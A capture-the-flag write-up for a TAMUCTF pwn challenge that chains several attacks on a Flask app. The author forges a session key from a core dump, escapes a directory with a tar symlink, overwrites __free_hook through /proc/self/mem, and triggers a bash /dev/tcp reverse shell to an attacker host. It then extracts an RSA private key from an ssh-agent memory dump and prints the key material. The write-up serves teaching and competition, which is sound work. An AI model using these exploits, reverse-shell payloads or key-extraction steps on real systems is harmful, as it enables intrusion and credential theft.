+++
title = 'TAMUCTF 2021 - Sevent Core of Hell'
date = '2020-04-26T00:00:00+07:00'
tags = ['ctf-writeup', 'pwn']
draft = false
+++

We are given a source of a flask application and the content is in this [gist](https://gist.github.com/circleous/007f4a30cb4a8472fdf893c63582404c), if you don't want to read the code, here is a TL;DR version of the flask app capabilities:

1.  app.secret_key is initialized with random.choice(digits+ascii_letters)
2.  To login as admin, the password is also checked with random.choice(digits+ascii_letters) repeated 256 times
3.  As an admin, we can do much more stuff like upload a file, upload a tar file, and browse or read files. The pathname is strictly checked from any LFI attempt, so we can't do any LFI.
4.  We have /dump/ route which will make a core dump of the current flask app and let us download it.

### First Stage - Bake the Cookie

The first stage is clear, now we have to elevate our user as an admin, but since the password is checked with random.choice every time, we have to find another way. We have a /dump/ route which will make a core dump of the current running flask app. A core dump is a memory snapshot of the app, so maybe we can search for app.secret_key and use it to forge a cookie. But how do we find a 256 bytes string on a huge ~90MB-ish file? Now comes the first pain. In python, you can use id() to get the object address. For example

```py
>>> a = ''.join(["c" for _ in range(256)])
>>> id(a)
140461683019248
...
(gdb) x/30gx 140461683019248
0x7fbfc8b88df0: 0x0000000000000000      0x00007fbfc934f920
0x7fbfc8b88e00: 0x0000000000000100      0xffffffffffffffff
0x7fbfc8b88e10: 0x00007fbfc8b5dde4      0x0000000000000000
0x7fbfc8b88e20: 0x6363636363636363      0x6363636363636363
0x7fbfc8b88e30: 0x6363636363636363      0x6363636363636363
0x7fbfc8b88e40: 0x6363636363636363      0x6363636363636363
0x7fbfc8b88e50: 0x6363636363636363      0x6363636363636363
0x7fbfc8b88e60: 0x6363636363636363      0x6363636363636363
0x7fbfc8b88e70: 0x6363636363636363      0x6363636363636363
0x7fbfc8b88e80: 0x6363636363636363      0x6363636363636363
0x7fbfc8b88e90: 0x6363636363636363      0x6363636363636363
0x7fbfc8b88ea0: 0x6363636363636363      0x6363636363636363
0x7fbfc8b88eb0: 0x6363636363636363      0x6363636363636363
0x7fbfc8b88ec0: 0x6363636363636363      0x6363636363636363
0x7fbfc8b88ed0: 0x6363636363636363      0x6363636363636363
```

If you play around with it a little bit more, you'll notice that one thing that's not changing is at offset 16 and it's the length of the string and followed by 0xffff... We can use this to our advantage as a pivot to get the secret key from the core dump. I used radare2 to find the bytes because r2 has an easier API to search for things. We can use `/x 0001000000000000ffffffffffffffff` to search our pivot and use `px @@ hit0_*` to iterate the found offset

```sh
    [0x7f0324527819]> /x 0001000000000000ffffffffffffffff
    ...
    [0x7f0324527819]> px @ hit0_*
    Do you want to print 459 lines? (y/N)
    - offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
    0x5644740ac160  0001 0000 0000 0000 ffff ffff ffff ffff  ................
    0x5644740ac170  a800 0000 0000 0000 0000 0000 0000 0000  ................
    0x5644740ac180  0000 0000 0000 0000 0000 0000 0000 0000  ................
    0x5644740ac190  0000 0000 0000 0000 0000 0100 0200 0300  ................
    0x5644740ac1a0  0400 0500 0600 0700 0800 0900 0a00 0b00  ................
    0x5644740ac1b0  0c00 0d00 0e00 0f00 1000 1100 1200 1300  ................
    0x5644740ac1c0  1400 1500 1600 1700 1800 1900 1a00 1b00  ................
    0x5644740ac1d0  1c00 1d00 1e00 1f00 2000 2100 2200 2300  ........ .!.".#.
    0x5644740ac1e0  2400 2500 2600 2700 2800 2900 2a00 2b00  $.%.&.'.(.).*.+.
    0x5644740ac1f0  2c00 2d00 2e00 2f00 3000 3100 3200 3300  ,.-.../.0.1.2.3.
    0x5644740ac200  3400 3500 3600 3700 3800 3900 3a00 3b00  4.5.6.7.8.9.:.;.
    0x5644740ac210  3c00 3d00 3e00 3f00 4000 4100 4200 4300  <.=.>[email protected].
    0x5644740ac220  4400 4500 4600 4700 4800 4900 4a00 4b00  D.E.F.G.H.I.J.K.
    0x5644740ac230  4c00 4d00 4e00 4f00 5000 5100 5200 5300  L.M.N.O.P.Q.R.S.
    0x5644740ac240  5400 5500 5600 5700 5800 5900 5a00 5b00  T.U.V.W.X.Y.Z.[.
    0x5644740ac250  5c00 5d00 5e00 5f00 6000 6100 6200 6300  \.].^._.`.a.b.c.
    - offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
    0x7f03225ab760  0001 0000 0000 0000 ffff ffff ffff ffff  ................
    0x7f03225ab770  4d36 5864 5746 6e6f 304a 4238 7a69 7335  M6XdWFno0JB8zis5
    0x7f03225ab780  5633 466a 704d 7447 6876 6853 5a4d 4b4b  V3FjpMtGhvhSZMKK
    0x7f03225ab790  4166 6d6d 596c 6a62 5141 4b35 7433 7879  AfmmYljbQAK5t3xy
    0x7f03225ab7a0  4a48 4f30 446d 6946 5866 4a5a 3556 4f57  JHO0DmiFXfJZ5VOW
    0x7f03225ab7b0  7561 6842 4258 737a 5750 3375 355a 6c4a  uahBBXszWP3u5ZlJ
    0x7f03225ab7c0  4438 5865 5179 5054 5435 4358 5130 5569  D8XeQyPTT5CXQ0Ui
    0x7f03225ab7d0  6c32 7530 3967 6462 424c 4f30 5471 7256  l2u09gdbBLO0TqrV
    0x7f03225ab7e0  6b52 4252 4967 655a 7747 6651 4764 5175  kRBRIgeZwGfQGdQu
    0x7f03225ab7f0  724f 6e6c 496d 5830 6933 4276 3148 5067  rOnlImX0i3Bv1HPg
    0x7f03225ab800  4a39 746b 7278 3372 4449 626f 3569 776e  J9tkrx3rDIbo5iwn
    0x7f03225ab810  346e 5773 664d 3879 796c 356c 784e 356b  4nWsfM8yyl5lxN5k
    0x7f03225ab820  3772 5335 7362 3458 5a79 457a 6244 7266  7rS5sb4XZyEzbDrf
    0x7f03225ab830  306e 6748 7136 6842 7370 7439 594f 6b69  0ngHq6hBspt9YOki
    0x7f03225ab840  3768 3168 424d 3769 476a 564b 7052 5543  7h1hBM7iGjVKpRUC
    0x7f03225ab850  4655 744d 6a42 364e 3966 5651 5442 4e6b  FUtMjB6N9fVQTBNk
    - offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
    0x7f03225ab9c0  0001 0000 0000 0000 ffff ffff ffff ffff  ................
    0x7f03225ab9d0  6400 6401 6c00 6d01 5a01 6d02 5a02 0100  d.d.l.m.Z.m.Z...
    0x7f03225ab9e0  6400 6402 6c03 6d04 5a04 6d05 5a05 6d06  d.d.l.m.Z.m.Z.m.
    0x7f03225ab9f0  5a06 6d07 5a07 6d08 5a08 6d09 5a09 6d0a  Z.m.Z.m.Z.m.Z.m.
    0x7f03225aba00  5a0a 6d0b 5a0b 6d0c 5a0c 6d0d 5a0d 6d0e  Z.m.Z.m.Z.m.Z.m.
    ...
```

Take a look at **0x7f03225ab760**, the charset used is exactly ascii_letters + digits. We can safely guess that this is the app.secret_key that we are trying to find. To test that we need to forge a cookie with that secret_key. There are several ways for doing this, but I choose to set the app.secret_key with the one we have found and add an /admin/ route that will automatically set the session, the code is here,

```py
@app.route('/admin/')
def admin():
    session["admin"] = True
    return ""
```

Just run this locally, go to /admin/, copy the session cookie and test it on the remote server by accessing /browse/.

### Second Stage - Symlink to The Rescue

Now we have admin privileges, but we still can't do anything because the accessible folder is tied down to ./files/. Fret not! As an admin, we can upload a .tar file and the server will extract it. Tar has this feature where you can add a symlink in the archive and still keep the symlink even after extracting it. This is perfect because we can make a symlink to / root dir, that way we can browse to / dir and get some kind of LFI. Here is the step create the malicious tar file,

```
$ mkdir test
$ ln -sf / test/root
$ tar -cvf exp.tar test
```

Upload exp.tar with batch upload and browse to /test/root/, now we have the ability to browse from the root directory. One thing you might have noticed after this, **there's no flag.txt on / directory**. So, where's the flag?

This is where you need to do another recon on what's happening on the server machine. Browsing through **/proc/\[pid\]/cmdline** to get a list of the running process, you'll notice there's an **ssh-agent** running. There's also another user named **alice** in /home/ directory, inside of it there's a private and public ssh key but we can read it because of the permission. So, how do we get the ssh key?

If you read the code, /dump/ is actually executing **sudo gcore \[os.getpid()\]**. Does this means we have sudo privilege? or does this means we only have privileges to execute gcore with sudo without password? Well, only one way to find out and that's to get RCE.

There're several ways to get RCE, but here's one of the easiest. **Overwrite \_\_free_hook with system()**, we may have a huge memory leak after this that make it really unstable, but hey, a _shell_ is a _shell_ right? We can **read /proc/self/maps** to get the base address leak and **upload_single with offset set to \_\_free_hook** and the content of the file should be the address to system, here's the script to do that

```py
#!/usr/bin/env python
import requests
from io import BytesIO
from pwn import *

def read_file(path, off=0, size=-1):
    res = requests.get(
        f"{URL}/get_file/",
        cookies=cookies,
        params={
            "file": f"test/root{path}",
            "offset": off,
            "size": size
        }
    )
    return res.content

def upload_file(content, path, filename, offset=0):
    res = requests.post(
        f"{URL}/upload_single/",
        cookies=cookies,
        data={
            "current_path": f"test/root{path}",
            "offset": offset,
        },
        files={ "data": (filename, BytesIO(content)) }
    )
    print(res.content)

pie = 0
heap = 0
libc_base = 0
def parse_maps(maps):
    global libc_base, pie, heap
    for line in maps.split("\n"):
        line = line.strip()
        if line == "":
            continue
        tok = line.split()
        l, r = tok[0].split("-")
        l = int(l, 16)
        r = int(r, 16)
        if (not libc_base) and "libc-2.28.so" in line:
            libc_base = l
        elif (not heap) and "heap" in line:
            heap = l
        elif (not pie) and "/usr/local/bin/python3.9" in line:
            pie = l

if args.PATCH:
    maps = read_file("/proc/self/maps").decode()
    parse_maps(maps)
    print(f"[+] pie 0x{pie:x}")
    print(f"[+] libc 0x{libc_base:x}")
    print(f"[+] heap 0x{heap:x}")

    libc = ELF("./libc.so.6",0)
    libc.address = libc_base
    upload_file(content=p64(libc.sym["system"]), path="/proc/self/",
            filename="mem", offset=libc.sym["__free_hook"])

Since we have set \_\_free_hook to system, this basically means that everything that we send to the flask app will get executed. This is because if we make an HTTP request, somewhere in the code it'll try to destruct the HTTP request buffer and that way we get an RCE. To trigger the RCE and get a rev shell, here's the HTTP request that I have used,

    POST /problem/${PORT}/add_note HTTP/1.1
    Host: shell.tamuctf.com
    Connection: close
    User-Agent: dumb
    Cookie: session=${TOKEN};

    /bin/bash -c "0<&196;exec 196<>/dev/tcp/${LHOST}/${LPORT}; bash <&196 >&196 2>&196"
```

### Third Stage - Steal the Key

Now we have RCE, thus we can have a better view of what's happening inside. Running **sudo -l** indeed gave us something. We are **only allowed to use gcore with sudo without a password**.

```sh
$ sudo -l
Matching Defaults entries for vault on 37565c96ce52:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vault may run the following commands on 37565c96ce52:
    (root) NOPASSWD: /usr/bin/gcore
$ ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 03:34 ?        00:00:00 sh /root/start.sh
root           8       1  0 03:34 ?        00:00:00 su - vault -c /home/vault/vault.sh
vault         11       8  0 03:34 ?        00:00:00 /bin/sh /home/vault/vault.sh
vault         15      11  0 03:34 ?        00:00:02 python /home/vault/server.py
alice         16       1  0 03:34 ?        00:00:00 ssh-agent -s
root          18       1  0 03:34 ?        00:00:00 /usr/sbin/sshd -D
...
```

Remember that there's an ssh-agent running, we can take a core dump of ssh-agent and maybe extract the ssh key that saved inside of it. This blog post and GitHub repo perfectly describe our current situation [https://blog.netspi.com/stealing-unencrypted-ssh-agent-keys-from-memory/](https://blog.netspi.com/stealing-unencrypted-ssh-agent-keys-from-memory/) and [https://github.com/NetSPI/sshkey-grab/](https://github.com/NetSPI/sshkey-grab/). Trying the parse_mem script from the GitHub repo, and only to find out we can't use it even after porting the script to python3. Thus, now comes the second pain, somehow we have the snapshot of ssh-agent memory, we need to take out the ssh key that's stored inside of it.

This is where we need to reverse engineer and reading the ssh-agent code ([https://anongit.mindrot.org/openssh.git/tree/ssh-agent.c](https://anongit.mindrot.org/openssh.git/tree/ssh-agent.c)). If you read the code, ssh-agent stores ssh keys into a global var

```c
struct idtable {
	int nentries;
	TAILQ_HEAD(idqueue, identity) idlist;
};

/* private key table */
struct idtable *idtab;
...
static void
process_remove_all_identities(SocketEntry *e)
{
	Identity *id;

	debug2_f("entering");
	/* Loop over all identities and clear the keys. */
	for (id = TAILQ_FIRST(&idtab->idlist); id;
	    id = TAILQ_FIRST(&idtab->idlist)) {
		TAILQ_REMOVE(&idtab->idlist, id, next);
		free_identity(id);
	}

	/* Mark that there are no identities. */
	idtab->nentries = 0;

	/* Send success. */
	send_status(e, 1);
}
```

**idtab** is exactly where we need to take a look. ssh-agent binary on the server is heavily optimized and striped, but you can still make sense out of it with string xref. For example, take a look at this IDA decompilation output and ssh-agent part of the code

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjGbxWJyVGWWSTVASjPAx-pGjXUvkKAZ8ou4-MZcsVbwoV3u3CIkeuHJAxPjSJtLoDdr1Fl0S-w_NWJYsrNCfGOFIQi_qgxdSwBFrYRlJyuNuxrB0_JQ_icBXrGs_QgEKlfXOzXt-h1aZM/w676-h278/Screen+Shot+2021-04-25+at+11.37.40.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjGbxWJyVGWWSTVASjPAx-pGjXUvkKAZ8ou4-MZcsVbwoV3u3CIkeuHJAxPjSJtLoDdr1Fl0S-w_NWJYsrNCfGOFIQi_qgxdSwBFrYRlJyuNuxrB0_JQ_icBXrGs_QgEKlfXOzXt-h1aZM/s1246/Screen+Shot+2021-04-25+at+11.37.40.png)

```c
static void
idtab_init(void)
{
	idtab = xcalloc(1, sizeof(*idtab));
	TAILQ_INIT(&idtab->idlist);
	idtab->nentries = 0;
}
...
#ifdef HAVE_SETRLIMIT
	/* deny core dumps, since memory contains unencrypted private keys */
	rlim.rlim_cur = rlim.rlim_max = 0;
	if (setrlimit(RLIMIT_CORE, &rlim) == -1) {
		error("setrlimit RLIMIT_CORE: %s", strerror(errno));
		cleanup_exit(1);
	}
#endif

skip:

	cleanup_pid = getpid();

#ifdef ENABLE_PKCS11
	pkcs11_init(0);
#endif
	new_socket(AUTH_SOCKET, sock);
	if (ac > 0)
		parent_alive_interval = 10;
	idtab_init();
...
```

It's not really perfectly the same because of the inlined function, but you can still make some assumptions that this is the same part as the code. So, now we have **0x4F7C0** as **idtab** offset from ELF base. Time to see the struct in radare2, (to get the ELF base just search for ELF string with **/ ELF**, there is some output but the real PIE base is usually starts with 0x5...)

```sh
[0x7f9a71bbc7e4]> pxq 8 @ 0x559d66738000+0x4f7c0
0x559d667877c0  0x0000559d672b32e0                       .2+g.U..
[0x7f9a71bbc7e4]> pxq 32 @ 0x0000559d672b32e0
0x559d672b32e0  0x0000000000000001  0x0000559d672b8740   ........@.+g.U..
0x559d672b32f0  0x0000559d672b8740  0x0000000000000231   @.+g.U..1.......
```

The first qword is exactly the number of entries and next to it is the pointer to identity struct.

```c
    typedef struct identity {
    	TAILQ_ENTRY(identity) next;
    	struct sshkey *key;
    	char *comment;
    	char *provider;
    	time_t death;
    	u_int confirm;
    	char *sk_provider;
    } Identity;
```

```sh
[0x7f9a71bbc7e4]> pxq 0x48 @ 0x0000559d672b8740
0x559d672b8740  0x0000000000000000  0x0000559d672b32e8   .........2+g.U..
0x559d672b8750  0x0000559d672b8910  0x0000559d672b5750   ..+g.U..PW+g.U..
0x559d672b8760  0x0000000000000000  0x0000000000000000   ................
0x559d672b8770  0x0000000000000000  0x0000000000000000   ................
0x559d672b8780  0x0000000000000000                       ........
[0x7f9a71bbc7e4]> ps @ 0x0000559d672b5750
alice@795df6b1e11b
```

The first 2 qwords are reserved for the TAILQ struct that's used for linked list, so our real data starts after it. That means **0x0000559d672b8910** is our pointer to ssh key and **0x0000559d672b5750** is our pointer to the comment string, and indeed it contains **alice@....**. At this point, I was so glad, because I'm already on the right track.

This is the content of ssh key and inside of it, we have a pointer to an RSA struct.

```c
// https://anongit.mindrot.org/openssh.git/tree/sshkey.h#n125
struct sshkey {
	int	 type;
	int	 flags;
	/* KEY_RSA */
	RSA	*rsa;
	/* KEY_DSA */
	DSA	*dsa;
	/* KEY_ECDSA and KEY_ECDSA_SK */
	int	 ecdsa_nid;	/* NID of curve */
	EC_KEY	*ecdsa;
...
```

/*
[0x7f9a71bbc7e4]> pxq 0x70 @ 0x0000559d672b8910
0x559d672b8910  0x0000000000000000  0x0000559d672b3640   ........@6+g.U..
0x559d672b8920  0x0000000000000000  0x00000000ffffffff   ................
0x559d672b8930  0x0000000000000000  0x0000000000000000   ................
0x559d672b8940  0x0000000000000000  0x0000000000000000   ................
0x559d672b8950  0x0000000000000000  0x0000000000000000   ................
0x559d672b8960  0x0000000000000000  0x0000000000000000   ................
0x559d672b8970  0x0000000000000000  0x0000000000000071   ........q.......
[0x7f9a71bbc7e4]> pxq @ 0x0000559d672b3640
0x559d672b3640  0x0000000000000000  0x00007f9a71f72e80   ...........q....
0x559d672b3650  0x0000000000000000  0x0000559d672b8120   ........ .+g.U..
0x559d672b3660  0x0000559d672b6490  0x0000559d672b6340   .d+g.U..@c+g.U..
0x559d672b3670  0x0000559d672b5160  0x0000559d672b88f0   `Q+g.U....+g.U..
0x559d672b3680  0x0000559d672b8140  0x0000559d672b4e90   @.+g.U...N+g.U..
0x559d672b3690  0x0000559d672b4ee0  0x0000000000000000   .N+g.U..........
0x559d672b36a0  0x0000000000000000  0x0000000000000000   ................
0x559d672b36b0  0x0000000e00000001  0x0000000000000000   ................
0x559d672b36c0  0x0000000000000000  0x0000000000000000   ................
0x559d672b36d0  0x0000000000000000  0x0000559d672b8180   ..........+g.U..
0x559d672b36e0  0x0000000000000000  0x0000559d672b52e0   .........R+g.U..
0x559d672b36f0  0x0000000000000000  0x0000000000000091   ................
*/
```

RSA is taken out of OpenSSL implementation and it's heavily using OpenSSL BIGNUM.

```c
// https://code.woboq.org/crypto/openssl/crypto/rsa/rsa.h.html#rsa_st
struct rsa_st
    {
    /* The first parameter is used to pickup errors where
     * this is passed instead of aEVP_PKEY, it is set to 0 */
    int pad;
    long version;
    const RSA_METHOD *meth;
    /* functional reference if 'meth' is ENGINE-provided */
    ENGINE *engine;
    BIGNUM *n;
    BIGNUM *e;
    BIGNUM *d;
    BIGNUM *p;
    BIGNUM *q;
    BIGNUM *dmp1;
    BIGNUM *dmq1;
    BIGNUM *iqmp;
    /* be careful using this if the RSA structure is shared */
    CRYPTO_EX_DATA ex_data;
    int references;
    int flags;
...
```

At this point, you just need to parse the pointers to n, e, d, p, q, ..... For example, e is the fifth qword of RSA struct,

```sh
[0x7f9a71bbc7e4]> pxq 16 @ 0x0000559d672b6490
0x559d672b6490  0x0000559d672b3620  0x0000000100000001    6+g.U..........
[0x7f9a71bbc7e4]> # first is BIGNUM pointer to d, and second is BIGNUM top value
[0x7f9a71bbc7e4]> pxq 16 @ 0x0000559d672b3620
0x559d672b3620  0x0000000000010001  0x0000559d672b4db0   .........M+g.U..
```

and it's indeed our value to e (0x10001). Here's the script to do the rest

```c
#include <openssl/bn.h>
#include <openssl/ossl_typ.h>
#include <stdint.h>
#include <stdio.h>

const uint64_t p[] = {
    0x3be14a864041825dULL, 0xed43050b8e04e488ULL, 0xf1be8b3bcd095f0eULL,
    0xcd30528134778f65ULL, 0xa0cab1f8c45923f6ULL, 0x406bd8bd8de1fb88ULL,
    0x2ce91d3d6ad7d8caULL, 0x484279fa9dda444cULL, 0x6a8bda7decb9bf28ULL,
    0x1c30447b4c53b827ULL, 0xaf8e2f25f2138a32ULL, 0xa2ba43be016dbd42ULL,
    0xe732fcbcab80cbd2ULL, 0x430e8a61dee31b07ULL, 0x149453c0841e16e5ULL,
    0xee29a73bdc029a08ULL};

const uint64_t q[] = {
    0xd60922a0489bb76fULL, 0xc0ecb819543a5054ULL, 0x316e7ae07e179dedULL,
    0xb9f7479f641753b6ULL, 0xc8488cae9660ff97ULL, 0x84f2c891984853b0ULL,
    0x442a09032a64a320ULL, 0xad992d53ee8ddf8aULL, 0xf817987c2c127fc0ULL,
    0x99a80a001a816a8aULL, 0x187b5f7b931f979dULL, 0x62e1f9c94e6979ccULL,
    0x1b80d9a6cecd78d0ULL, 0xc18f881921561f0cULL, 0x2e1a2874130fcbecULL,
    0xdf190eeb59b30149ULL};

const uint64_t n[] = {
    0x13d77098c6e70153ULL, 0xb16734ea8f415c7aULL, 0xf6c1d7a24d7912d5ULL,
    0xf07dad19cbb79002ULL, 0xeb3c099ab487f180ULL, 0x5d5aa6cbad40e531ULL,
    0x307616dd9b41411dULL, 0xa1cc75c88187a570ULL, 0x3cd02a8b3834d842ULL,
    0xd4f4429bbddff9f7ULL, 0x288ec4d8c8148c4eULL, 0xd71fed2d250cc0d1ULL,
    0x258661498cde4070ULL, 0x8dace20c6e37c2f9ULL, 0x2b7b9ef5f0463e96ULL,
    0xb8aafb929ebf74e7ULL, 0x865d485dac68e895ULL, 0x6f29a98d570a704aULL,
    0x738af70adcb9cda5ULL, 0xeaf05781ef72a1fcULL, 0xe8220c857c2e0dd4ULL,
    0x302642c692dae903ULL, 0x67c7abb749751baaULL, 0x34541dfe55dbec90ULL,
    0x9fdc06ad71832d2cULL, 0xf642557e840d79e2ULL, 0xdbea7641a56477d6ULL,
    0x47d87d7417348bfbULL, 0x96e2994306470bd8ULL, 0x8886b2adc9464d21ULL,
    0x2c4a893260202a0eULL, 0xcf8d989fb4538ddfULL};

const uint64_t d[] = {
  0xc970494fe69c1c29ULL, 0x5a4a3daa3686b40fULL, 0x92c7522a35634fb7ULL,
  0x7001df21dc30fa52ULL, 0xcd09d2125bbed001ULL, 0x17d29354edf69d32ULL,
  0x64104b587101b58cULL, 0x401ffbfc989981d5ULL, 0x30016da97f319fb9ULL,
  0x3b593593706eda4aULL, 0xa42a82066cff7b65ULL, 0xfd397d3f26824bebULL,
  0xc794c5fe25c5fa23ULL, 0x76b839d8ce910db5ULL, 0xf883e0c6e51e2d5fULL,
  0x1b889968692568caULL, 0x223590e9b979da4aULL, 0xfa1a3aba55f8c628ULL,
  0xcee6c0b2ac7e717aULL, 0x9cb3d4945918600cULL, 0x85a5ea4e778a8afdULL,
  0xe79358416aef1be1ULL, 0xfefb0c4a293590a7ULL, 0xa5bdadb88776b3c9ULL,
  0xf4a7e46993e3cb8bULL, 0x64434d55aa4042b6ULL, 0x477f05b4dc35e237ULL,
  0x1438f34294c154d9ULL, 0xe93a6c28346def01ULL, 0x0ff80a5eb1a45a7fULL,
  0x85c0cfe4f8337574ULL, 0x5de8ee76cc6bc5d4ULL
};

const uint64_t c[] = {
  0xeb93e80ec4d7142fULL, 0xe46d6e5c4c445e90ULL, 0x405731b6a0cdfd88ULL,
  0xe988b1463dba43e3ULL, 0xdbaae4cd9b6f08ceULL, 0x41987261d284b062ULL,
  0x33749e6eadc4cc63ULL, 0x7069525cccad597fULL, 0xca4cc726153f5503ULL,
  0xab6febe1bf762849ULL, 0xfe18056a07a53f5fULL, 0x34a9088adf0137e7ULL,
  0xf3e0ba1066c3f45fULL, 0xa47a451bc90ea084ULL, 0xf34baebaffb37fd3ULL,
  0x0ab32488acac9a92ULL
};

struct bignum_st {
  uint64_t *d; /* Pointer to an array of 'BN_BITS2' bit chunks. */
  int top;     /* Index of last used d +1. */
  /* The next are internal book keeping for bn_expand. */
  int dmax; /* Size of the d array. */
  int neg;  /* one if the number is negative */
  int flags;
};

typedef struct bignum_st BIGNUM;

void bn2bin(const uint64_t *a, int n, unsigned char *to) {
  uint64_t l;
  int i = (n + 7) / 8;
  while (i--) {
    l = a[i / 8];
    *(to++) = (unsigned char)(l >> (8 * (i % 8))) & 0xff;
  }
}

void hexdump(unsigned char *buf, int n) {
  for (int i = 0; i < n; ++i)
    printf("%02x", buf[i]);
  putchar(10);
}

int main() {
  BIGNUM *n_bn = BN_new();
  n_bn->d = (uint64_t *)n;
  n_bn->top = 32;
  char *nbuf = BN_bn2hex(n_bn);
  printf("n = 0x%s\n", nbuf);
  BIGNUM *d_bn = BN_new();
  d_bn->d = (uint64_t *)d;
  d_bn->top = 32;
  char *dbuf = BN_bn2hex(d_bn);
  printf("d = 0x%s\n", dbuf);
  BIGNUM *p_bn = BN_new();
  p_bn->d = (uint64_t *)p;
  p_bn->top = 16;
  char *pbuf = BN_bn2hex(p_bn);
  printf("p = 0x%s\n", pbuf);
  BIGNUM *q_bn = BN_new();
  q_bn->d = (uint64_t *)q;
  q_bn->top = 16;
  char *qbuf = BN_bn2hex(q_bn);
  printf("q = 0x%s\n", qbuf);
  BIGNUM *c_bn = BN_new();
  c_bn->d = (uint64_t *)c;
  c_bn->top = 16;
  char *cbuf = BN_bn2hex(c_bn);
  printf("c = 0x%s\n", cbuf);
  return 0;
}
```

and this output into hex digits of the RSA parameter

    n = 0xCF8D989FB4538DDF2C4A893260202A0E8886B2ADC9464D2196E2994306470BD847D87D7417348BFBDBEA7641A56477D6F642557E840D79E29FDC06AD71832D2C34541DFE55DBEC9067C7ABB749751BAA302642C692DAE903E8220C857C2E0DD4EAF05781EF72A1FC738AF70ADCB9CDA56F29A98D570A704A865D485DAC68E895B8AAFB929EBF74E72B7B9EF5F0463E968DACE20C6E37C2F9258661498CDE4070D71FED2D250CC0D1288EC4D8C8148C4ED4F4429BBDDFF9F73CD02A8B3834D842A1CC75C88187A570307616DD9B41411D5D5AA6CBAD40E531EB3C099AB487F180F07DAD19CBB79002F6C1D7A24D7912D5B16734EA8F415C7A13D77098C6E70153
    d = 0x5DE8EE76CC6BC5D485C0CFE4F83375740FF80A5EB1A45A7FE93A6C28346DEF011438F34294C154D9477F05B4DC35E23764434D55AA4042B6F4A7E46993E3CB8BA5BDADB88776B3C9FEFB0C4A293590A7E79358416AEF1BE185A5EA4E778A8AFD9CB3D4945918600CCEE6C0B2AC7E717AFA1A3ABA55F8C628223590E9B979DA4A1B889968692568CAF883E0C6E51E2D5F76B839D8CE910DB5C794C5FE25C5FA23FD397D3F26824BEBA42A82066CFF7B653B593593706EDA4A30016DA97F319FB9401FFBFC989981D564104B587101B58C17D29354EDF69D32CD09D2125BBED0017001DF21DC30FA5292C7522A35634FB75A4A3DAA3686B40FC970494FE69C1C29
    p = 0xEE29A73BDC029A08149453C0841E16E5430E8A61DEE31B07E732FCBCAB80CBD2A2BA43BE016DBD42AF8E2F25F2138A321C30447B4C53B8276A8BDA7DECB9BF28484279FA9DDA444C2CE91D3D6AD7D8CA406BD8BD8DE1FB88A0CAB1F8C45923F6CD30528134778F65F1BE8B3BCD095F0EED43050B8E04E4883BE14A864041825D
    q = 0xDF190EEB59B301492E1A2874130FCBECC18F881921561F0C1B80D9A6CECD78D062E1F9C94E6979CC187B5F7B931F979D99A80A001A816A8AF817987C2C127FC0AD992D53EE8DDF8A442A09032A64A32084F2C891984853B0C8488CAE9660FF97B9F7479F641753B6316E7AE07E179DEDC0ECB819543A5054D60922A0489BB76F
    c = 0x0AB32488ACAC9A92F34BAEBAFFB37FD3A47A451BC90EA084F3E0BA1066C3F45F34A9088ADF0137E7FE18056A07A53F5FAB6FEBE1BF762849CA4CC726153F55037069525CCCAD597F33749E6EADC4CC6341987261D284B062DBAAE4CD9B6F08CEE988B1463DBA43E3405731B6A0CDFD88E46D6E5C4C445E90EB93E80EC4D7142F

Reconstruct this to PEM format, and we finally can use it as a private key to log in with ssh.

    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEAz42Yn7RTjd8sSokyYCAqDoiGsq3JRk0hluKZQwZHC9hH2H10
    FzSL+9vqdkGlZHfW9kJVfoQNeeKf3AatcYMtLDRUHf5V2+yQZ8ert0l1G6owJkLG
    ktrpA+giDIV8Lg3U6vBXge9yofxzivcK3LnNpW8pqY1XCnBKhl1IXaxo6JW4qvuS
    nr905yt7nvXwRj6WjaziDG43wvklhmFJjN5AcNcf7S0lDMDRKI7E2MgUjE7U9EKb
    vd/59zzQKos4NNhCocx1yIGHpXAwdhbdm0FBHV1apsutQOUx6zwJmrSH8YDwfa0Z
    y7eQAvbB16JNeRLVsWc06o9BXHoT13CYxucBUwIDAQABAoIBAF3o7nbMa8XUhcDP
    5PgzdXQP+ApesaRaf+k6bCg0be8BFDjzQpTBVNlHfwW03DXiN2RDTVWqQEK29Kfk
    aZPjy4ulva24h3azyf77DEopNZCn55NYQWrvG+GFpepOd4qK/Zyz1JRZGGAMzubA
    sqx+cXr6Gjq6VfjGKCI1kOm5edpKG4iZaGklaMr4g+DG5R4tX3a4OdjOkQ21x5TF
    /iXF+iP9OX0/JoJL66QqggZs/3tlO1k1k3Bu2kowAW2pfzGfuUAf+/yYmYHVZBBL
    WHEBtYwX0pNU7fadMs0J0hJbvtABcAHfIdww+lKSx1IqNWNPt1pKPao2hrQPyXBJ
    T+acHCkCgYEA7imnO9wCmggUlFPAhB4W5UMOimHe4xsH5zL8vKuAy9KiukO+AW29
    Qq+OLyXyE4oyHDBEe0xTuCdqi9p97Lm/KEhCefqd2kRMLOkdPWrX2MpAa9i9jeH7
    iKDKsfjEWSP2zTBSgTR3j2Xxvos7zQlfDu1DBQuOBOSIO+FKhkBBgl0CgYEA3xkO
    61mzAUkuGih0Ew/L7MGPiBkhVh8MG4DZps7NeNBi4fnJTml5zBh7X3uTH5edmagK
    ABqBaor4F5h8LBJ/wK2ZLVPujd+KRCoJAypkoyCE8siRmEhTsMhIjK6WYP+XufdH
    n2QXU7Yxbnrgfhed7cDsuBlUOlBU1gkioEibt28CgYEAyIdf3QHhWupE0aM3LMbd
    BkqQ2qmPbu9alyuSLBXHi1aeV3EkcbWBrr18XWx4yEUK7jsh3iMlNqBRkNH2RzUa
    pAM7ndMLyDTLYuEhEo58kXeyCFxlNiq5jI++O123jUq/yoLOZSXVKXNvub0oK/qh
    BEN3s67H9IyrvKd0BVfjEK0CgYEAmfoBgg32rfyEBSnGcyGD7XPqTFSL3ZSwFotn
